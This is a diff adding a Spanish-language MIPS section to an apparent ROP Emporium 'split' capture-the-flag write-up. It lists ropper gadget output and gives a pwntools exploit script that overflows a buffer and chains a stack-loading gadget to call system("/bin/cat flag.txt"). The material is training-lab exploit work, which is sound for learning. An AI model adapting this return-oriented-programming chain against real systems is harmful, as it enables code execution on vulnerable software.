@@ -148,4 +148,62 @@ io.sendline(payload)
 io.success(io.recvuntil(b"}").decode())
 ```
 
-# Notas
+# MIPS
+
+Necesitamos almacenar la dirección de "/bin/cat flag.txt" en `a0` e invocar system.
+```
+─$ ropper -f split_mipsel | grep a0
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+0x0040087c: addiu $a0, $v0, 0xc20; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400898: addiu $a0, $v0, 0xc38; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x004008c0: addiu $a0, $v0, 0xc40; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400938: addiu $a0, $v0, 0xc4c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400954: addiu $a0, $v0, 0xc78; lw $v0, -0x7fa4($gp); move $t9, $v0; jalr $t9; nop;
+0x00400994: addiu $a0, $v0, 0xc7c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x004009e8: addiu $a0, $v0, 0xc88; lw $v0, -0x7fac($gp); move $t9, $v0; jalr $t9; nop;
+0x00400708: addiu $gp, $gp, -0x6fd0; lw $t9, -0x7fa0($gp); beqz $t9, 0x720; nop; jr $t9; nop;
+0x00400a94: addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
+0x00400918: addiu $v0, $fp, 0x18; move $a0, $v0; lw $v0, -0x7fbc($gp); move $t9, $v0; jalr $t9; nop;
+0x00400aa0: jalr $t9; move $a0, $s3;
+0x00400878: lui $v0, 0x40; addiu $a0, $v0, 0xc20; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400894: lui $v0, 0x40; addiu $a0, $v0, 0xc38; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x004008bc: lui $v0, 0x40; addiu $a0, $v0, 0xc40; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400934: lui $v0, 0x40; addiu $a0, $v0, 0xc4c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400950: lui $v0, 0x40; addiu $a0, $v0, 0xc78; lw $v0, -0x7fa4($gp); move $t9, $v0; jalr $t9; nop;
+0x00400990: lui $v0, 0x40; addiu $a0, $v0, 0xc7c; lw $v0, -0x7fa8($gp); move $t9, $v0; jalr $t9; nop;
+0x004009e4: lui $v0, 0x40; addiu $a0, $v0, 0xc88; lw $v0, -0x7fac($gp); move $t9, $v0; jalr $t9; nop;
+0x00400a20: lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
+0x00400a90: lw $t9, ($s0); addiu $s1, $s1, 1; move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
+0x0040070c: lw $t9, -0x7fa0($gp); beqz $t9, 0x720; nop; jr $t9; nop;
+0x00400ba0: lw $t9, -0x7ff0($gp); move $t7, $ra; jalr $t9; addiu $t8, $zero, 0xa;
+0x00400860: move $a0, $v0; lw $v0, -0x7fb8($gp); move $t9, $v0; jalr $t9; nop;
+0x0040091c: move $a0, $v0; lw $v0, -0x7fbc($gp); move $t9, $v0; jalr $t9; nop;
+0x00400978: move $a0, $zero; lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
+0x00400a9c: move $a1, $s4; jalr $t9; move $a0, $s3;
+0x00400974: move $a1, $v0; move $a0, $zero; lw $v0, -0x7f9c($gp); move $t9, $v0; jalr $t9; nop;
+0x0040085c: move $a1, $zero; move $a0, $v0; lw $v0, -0x7fb8($gp); move $t9, $v0; jalr $t9; nop;
+0x00400a98: move $a2, $s5; move $a1, $s4; jalr $t9; move $a0, $s3;
+0x00400a1c: nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
+0x00400a18: nop; nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
+```
+
+Aquí el gadget en 0x00400a1c nos es útil porque nos permite hacer ambas cosas con offst relativos al stack, este es bueno.
+```py
+from pwn import *
+io = process("qemu-mipsel -L /usr/mipsel-linux-gnu split_mipsel",shell=True)
+
+gadget = 0x00400a1c # nop; lw $a0, 8($sp); lw $t9, 4($sp); jalr $t9; nop;
+
+# system("/bin/cat flag.txt")
+payload = b""
+payload += b"A"*36
+payload += p32(gadget)
+payload += p32(0)
+payload += p32(0x00400b70)       # $t9 =  &system
+payload += p32(0x00411010)       # $a0 =  "/bin/cat flag.txt"
+
+io.send(payload)
+io.interactive()
+```
